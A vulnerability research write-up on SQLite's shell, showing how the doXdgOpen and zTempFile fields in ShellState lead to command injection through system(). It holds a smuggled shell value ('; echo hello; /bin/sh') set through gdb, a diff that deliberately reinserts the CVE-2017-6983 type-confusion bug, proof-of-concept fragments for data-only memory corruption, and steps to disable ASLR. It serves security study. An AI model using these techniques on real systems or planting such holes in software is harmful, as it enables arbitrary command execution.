# p->doXdgOpen

This critical variable exists in [SQLite](https://www.sqlite.org/), a widely used lightweight database management system (DBMS).

Our analysis is performed on version 3.40.1. The following instructions provide a way to obtain a copy of the source code.

```bash
$ git clone https://github.com/sqlite/sqlite.git
$ cd sqlite
$ git checkout version-3.40.1 #-> commit 1fdaa9d1a7
```

You may need to compile the source code to produce the file `sqlite3.c` and `shell.c`.

```bash
# (within sqlite folder)
$ ./configure
$ make
$ ls -l sqlite3.c shell.c
```

## TL;DR

Structure `ShellState` maintains the shell session information, where `doXdgOpen` and `zTempFile` are two member fields. 

If `p->doXdgOpen` is `true`, the following instructions `zCmd = sqlite3_mprintf("%s %s", zXdgOpenCmd, p->zTempFile);` and `system(zCmd)` will be executed. Normally, `doXdgOpen` is `false`. An attacker can modify `doXdgOpen` and `zTempFile` at begining to perform attacks.

Here is the related code:

```c
    if( p->doXdgOpen ){
    
      const char *zXdgOpenCmd = "xdg-open";

      char *zCmd;
      zCmd = sqlite3_mprintf("%s %s", zXdgOpenCmd, p->zTempFile);
      if( system(zCmd) ){
        utf8_printf(stderr, "Failed: [%s]\n", zCmd);
      }
```

## Description

### SQLite logic

Structure `ShellState` for maintaining the shell status information: 

```c
/*
** State information about the database connection is contained in an
** instance of the following structure.
*/
typedef struct ShellState ShellState;
struct ShellState {
  sqlite3 *db;           /* The database */
  u8 autoExplain;        /* Automatically turn on .explain mode */
  u8 autoEQP;            /* Run EXPLAIN QUERY PLAN prior to seach SQL stmt */
  u8 autoEQPtest;        /* autoEQP is in test mode */
  u8 autoEQPtrace;       /* autoEQP is in trace mode */
  ...
  u8 doXdgOpen;          /* Invoke start/open/xdg-open in output_reset() */
  ...
  char *zTempFile;       /* Temporary file that might need deleting */
  ...
  EQPGraph sGraph;       /* Information for the graphical EXPLAIN QUERY PLAN */
  ExpertInfo expert;     /* Valid if previous command was ".expert OPT..." */
};
```

You can create a sqlite shell by simply typing `./sqlite3 [path-to-database-file]`. 

By default, sqlite receives the SQL query (input to sqlite) from `stdin`, and prints the query results on `stdout`. Here is an example of the sqlite shell:

```bash
$ sqlite3
SQLite version 3.37.0 2021-12-09 01:34:53
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> create table T (c int);
sqlite> insert into T values (0), (1), (2);
sqlite> select * from T;
0
1
2
```

However, sometimes you may want to save the result to a file. sqlite supports this feature with the following options:

```sql
sqlite> .help
...
.excel                   Display the output of next command in spreadsheet
...
.once ?OPTIONS? ?FILE?   Output for the next SQL command only to FILE
...
.output ?FILE?           Send output to FILE or stdout if FILE is omitted
...
.testcase NAME           Begin redirecting output to 'testcase-out.txt'
...
```

**More details are available at https://www.sqlite.org/cli.html#writing_results_to_a_file**

More than that, sometimes you may want to edit the result a little bit before saving them into the file system. No problem, sqlite provides the nice feature that will save the result into a temporary file and immediately opens that file for you:

```sql
sqlite> .once -E
.once ?OPTIONS? ?FILE?   Output for the next SQL command only to FILE
     If FILE begins with '|' then open as a pipe
       --bom  Put a UTF8 byte-order mark at the beginning
       -e     Send output to the system text editor
       -x     Send output as CSV to a spreadsheet (same as ".excel")
sqlite> .once -e
sqlite> select * from T;   <------- try it
```

After the last SQL query, sqlite will open the system text editor, which should contain the result of this query.

The implementation details of this feature can be found in shell.c. What we care about is the code to open the system text editor, i.e., function `output_reset`:

```c
/*
** Change the output file back to stdout.
**
** If the p->doXdgOpen flag is set, that means the output was being
** redirected to a temporary file named by p->zTempFile.  In that case,
** launch start/open/xdg-open on that temporary file.
*/
static void output_reset(ShellState *p){
  if( p->outfile[0]=='|' ){
#ifndef SQLITE_OMIT_POPEN
    pclose(p->out);
#endif
  }else{
    output_file_close(p->out);
#ifndef SQLITE_NOHAVE_SYSTEM
a.  if( p->doXdgOpen ){
      const char *zXdgOpenCmd =
#if defined(_WIN32)
      "start";
#elif defined(__APPLE__)
      "open";
#else
      "xdg-open";
#endif
      char *zCmd;
b.     zCmd = sqlite3_mprintf("%s %s", zXdgOpenCmd, p->zTempFile);
c.     if( system(zCmd) ){
        utf8_printf(stderr, "Failed: [%s]\n", zCmd);
      }else{
        /* Give the start/open/xdg-open command some time to get
        ** going before we continue, and potential delete the
        ** p->zTempFile data file out from under it */
        sqlite3_sleep(2000);
      }
      sqlite3_free(zCmd);
      outputModePop(p);
      p->doXdgOpen = 0;
    }
#endif /* !defined(SQLITE_NOHAVE_SYSTEM) */
  }
  p->outfile[0] = 0;
  p->out = stdout;
}
```

`output_reset` is the function that cleans up every thing and restores the output to the `stdout`. Pay attention to lines labeled with a, b, and c. In line a, sqlite checks whether `doXdgOpen` is set. This variable is set when the user types `.once -x` or `.once -e` or `.excel` (which means the user wants sqlite opens system text/excel editor to modify the result). If so, sqlite will move on to construct the command `zCmd`. `zXdgOpenCmd` is the system-specific command that automatically finds propoer applications to open particular-format files. On Linux system, the shell command is `xdg-open`, while on Mac, the shell command is `open`. The temporary file name is stored in `zTempFile`, which is a predefined string but can be updated by user command (this is why it is a variable, not a constant). At last, sqlite uses line c to run the command, which will pop up the window of either text editor or excel editor.

## Attack in GDB

## Attack

Attacker sets `doXdgOpen` to `true` and set `zTempFile` to a string `; echo 'hello', /bin/sh`. Then, when execution continues, `echo 'hello'` and `/bin/sh` will be executed.

In the first step, start sqlite

```bash
$ sqlite3
SQLite version 3.37.0 2021-12-09 01:34:53
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite>
```

In another terminal, attach gdb to the process
```bash
$ sudo gdb -p `pgrep sqlite3`
...
```

Go to the `main` function frame, and update the two members:
```bash
(gdb) bt
#0  0x00007f3b44e5807b in __pselect (nfds=1, readfds=0x7ffd187094f0, writefds=0x0, exceptfds=0x0, timeout=<optimized out>, sigmask=0x7f3b45173c20 <_rl_orig_sigset>)
    at ../sysdeps/unix/sysv/linux/pselect.c:48
#1  0x00007f3b45153be9 in rl_getc () from /lib/x86_64-linux-gnu/libreadline.so.8
#2  0x00007f3b45154503 in rl_read_key () from /lib/x86_64-linux-gnu/libreadline.so.8
#3  0x00007f3b45139c82 in readline_internal_char () from /lib/x86_64-linux-gnu/libreadline.so.8
#4  0x00007f3b4513a4ed in readline () from /lib/x86_64-linux-gnu/libreadline.so.8
#5  0x0000000000431b88 in one_input_line (in=0x0, zPrior=0x0, isContinuation=0) at shell.c:656
#6  0x00000000004155b2 in process_input (p=0x7ffd187097c8) at shell.c:18343
#7  0x000000000040a5f7 in main (argc=1, argv=0x7ffd1870adc8) at shell.c:19152
(gdb) frame 7
#7  0x000000000040a5f7 in main (argc=1, argv=0x7ffd1870adc8) at shell.c:19152
19152         rc = process_input(&data);
(gdb) p data.doXdgOpen
$1 = 0 '\000'
(gdb) p data.zTempFile
$2 = 0x0
(gdb) set data.doXdgOpen = 1
(gdb) set data.zTempFile = "; echo hello; /bin/sh"
(gdb) p data.doXdgOpen
$3 = 1 '\001'
(gdb) p data.zTempFile
$4 = 0x7f3b44d42990 "; echo hello; /bin/sh"
```

Attack done. Quite gdb

```
(gdb) quit
A debugging session is active.

        Inferior 1 [process XXXX] will be detached.

Quit anyway? (y or n) y
```

Go to the sqlite shell, quite the shell

```sql
sqlite> .exit
sh: 1: xdg-open: not found
hello
$
```

## Attack in the wild

### Gain arbitrary memory-write primitive

There is a type confusion bug in SQLite that can provide arbitrary memory-write primitive.

CVE-2017-6983
* [presentation](https://www.youtube.com/watch?v=Kqv8S1BQYwE&ab_channel=BlackHat)
* [slides p39-p60](https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf)

However, the bug is fixed in SQLite 3.40.1 and the `p->doXdgOpen` is not defined in old version. We manually insert the bug into new version.
```c
static int fts3FunctionArg(
  sqlite3_context *pContext,      /* SQL function call context */
  const char *zFunc,              /* Function name */
  sqlite3_value *pVal,            /* argv[0] passed to function */
  Fts3Cursor **ppCsr              /* OUT: Store cursor handle here */
){
  int rc;
  /* Insert Vuln */
+  Fts3Cursor *pRet;
+  memcpy(&pRet, sqlite3_value_blob(pVal), sizeof(Fts3Cursor *));
+  *ppCsr = pRet;
- *ppCsr = (Fts3Cursor*)sqlite3_value_pointer(pVal, "fts3cursor");
  if( (*ppCsr)!=0 ){
    rc = SQLITE_OK;
  }else{
    char *zErr = sqlite3_mprintf("illegal first argument to %s", zFunc);
    sqlite3_result_error(pContext, zErr, -1);
    sqlite3_free(zErr);
    rc = SQLITE_ERROR;
  }
  return rc;
}
```

### Compile SQLite
```
CC="clang -DSQLITE_DEBUG" ./configure --enable-debug
make
```

### PoC

We exploit the vulnerability twice to corrupt `p->doXdgOpen` and `p->zTempFile` respectively. We disabled ASLR in this attack, so the address of p and faked structures are fixed. Bypassing ASLR is also feasible as demonstrated in page 60 of the slide. The complete PoC can be found in [poc.py](./poc.py).

```
# Corrupt p->doXdgOpen to 1
# set zMalloc (dest of memcpy) in sqlite3_value
exp = writeVal(exp, sqlite3_value_off + 0x40, doXdgOpen, 8)

# add a src string to test
exp = writeVal(exp, src_off, 0x1, 1)
```
```
# Corrupt p->zTempFile to ";hello"
# set zMalloc (dest of memcpy) in sqlite3_value
exp_2 = writeVal(exp_2, sqlite3_value_off + 0x40, zTempFile, 8)

# add a src string ptr to test
exp_2 = writeVal(exp_2, src_off, src_base_2 + 0x8, 8)

# add a src string ";hello"
exp_2 = writeVal(exp_2, src_off + 0x8, 0x6f6c6c6568206863756f743b, 13)
```

```
// exploit
// We need to figure out the correct base address and shellstate address
rm -rf ~/.sqlite*
./doXdgOpen-exp.py
gdb ./sqlite3
    b output_reset
    r < /tmp/exp

command "touch hello" is executed and we can find file "hello" in current folder.
```

## Tips

### Disable ASLR
```
cat /proc/sys/kernel/randomize_va_space
sudo sysctl kernel.randomize_va_space=0 
```

### Get size of a variable/type
```
print sizeof(val)
print sizeof(Type)
```

### Get offside of a member
```
gdb-peda$ p/x &(((Fts3Table *)0)->db)
```

### Clear cache
`rm ~/.sqlite*`
